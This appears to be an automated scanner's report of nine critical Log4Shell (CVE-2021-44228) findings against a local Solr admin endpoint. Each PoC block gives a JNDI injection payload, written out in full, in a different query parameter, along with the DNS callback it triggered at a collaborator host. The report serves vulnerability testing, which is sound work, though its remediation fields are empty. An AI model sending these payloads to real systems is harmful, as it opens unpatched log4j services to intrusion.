# Log4Shell P6

**Scope:** localhost, 127.0.0.1
**Date:** 2026-07-19 - 2026-07-19
**Risk Rating:** Critical
**Total Findings:** 9

---

## 1. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — action

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/iunyeq6c7ybwumbg36cf2kt2vq}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=action verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/iunyeq6c7ybwumbg36cf2kt2vq} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/iunyeq6c7ybwumbg36cf2kt2vq}
callback_nonce='iunyeq6c7ybwumbg36cf2kt2vq' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=iunyeq6c7ybwumbg36cf2kt2vq path= received_at=1784484978.881
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 2. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — core

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — core=${jndi:dns://host.docker.internal:15353/5o2fztocymhvlcvssxogmrlwxi}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=core verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/5o2fztocymhvlcvssxogmrlwxi} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — core=${jndi:dns://host.docker.internal:15353/5o2fztocymhvlcvssxogmrlwxi}
callback_nonce='5o2fztocymhvlcvssxogmrlwxi' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=5o2fztocymhvlcvssxogmrlwxi path= received_at=1784484978.886
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 3. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — name

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — name=${jndi:dns://host.docker.internal:15353/y74pzom7rk52zlrkbzpidwewf4}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=name verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/y74pzom7rk52zlrkbzpidwewf4} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — name=${jndi:dns://host.docker.internal:15353/y74pzom7rk52zlrkbzpidwewf4}
callback_nonce='y74pzom7rk52zlrkbzpidwewf4' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=y74pzom7rk52zlrkbzpidwewf4 path= received_at=1784484978.892
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 4. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — instanceDir

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — instanceDir=${jndi:dns://host.docker.internal:15353/fapkulszdamjq557cazudiqxui}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=instanceDir verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/fapkulszdamjq557cazudiqxui} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — instanceDir=${jndi:dns://host.docker.internal:15353/fapkulszdamjq557cazudiqxui}
callback_nonce='fapkulszdamjq557cazudiqxui' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=fapkulszdamjq557cazudiqxui path= received_at=1784484978.898
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 5. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — property.instanceDir

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — property.instanceDir=${jndi:dns://host.docker.internal:15353/locacsis5r2yqv5ewtw2qkfrjq}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=property.instanceDir verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/locacsis5r2yqv5ewtw2qkfrjq} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — property.instanceDir=${jndi:dns://host.docker.internal:15353/locacsis5r2yqv5ewtw2qkfrjq}
callback_nonce='locacsis5r2yqv5ewtw2qkfrjq' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=locacsis5r2yqv5ewtw2qkfrjq path= received_at=1784484978.905
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 6. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — other

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — other=${jndi:dns://host.docker.internal:15353/hp7v52dhy3ugecjsvtyktmy3xi}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=other verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/hp7v52dhy3ugecjsvtyktmy3xi} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — other=${jndi:dns://host.docker.internal:15353/hp7v52dhy3ugecjsvtyktmy3xi}
callback_nonce='hp7v52dhy3ugecjsvtyktmy3xi' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=hp7v52dhy3ugecjsvtyktmy3xi path= received_at=1784484978.913
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 7. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — requestid

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — requestid=${jndi:dns://host.docker.internal:15353/ykbiprljusclpvab7ykbpthl2u}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=requestid verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/ykbiprljusclpvab7ykbpthl2u} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — requestid=${jndi:dns://host.docker.internal:15353/ykbiprljusclpvab7ykbpthl2u}
callback_nonce='ykbiprljusclpvab7ykbpthl2u' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=ykbiprljusclpvab7ykbpthl2u path= received_at=1784484978.920
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 8. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — op

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — op=${jndi:dns://host.docker.internal:15353/74ao4wwgnvolutrrd5tgcesh44}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=op verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/74ao4wwgnvolutrrd5tgcesh44} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — op=${jndi:dns://host.docker.internal:15353/74ao4wwgnvolutrrd5tgcesh44}
callback_nonce='74ao4wwgnvolutrrd5tgcesh44' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=74ao4wwgnvolutrrd5tgcesh44 path= received_at=1784484978.930
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---

## 9. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — action

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/dfc22io5i5bs47u66vjen6xnja}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=action verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/dfc22io5i5bs47u66vjen6xnja} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/dfc22io5i5bs47u66vjen6xnja}
callback_nonce='dfc22io5i5bs47u66vjen6xnja' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=dfc22io5i5bs47u66vjen6xnja path= received_at=1784484984.442
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---
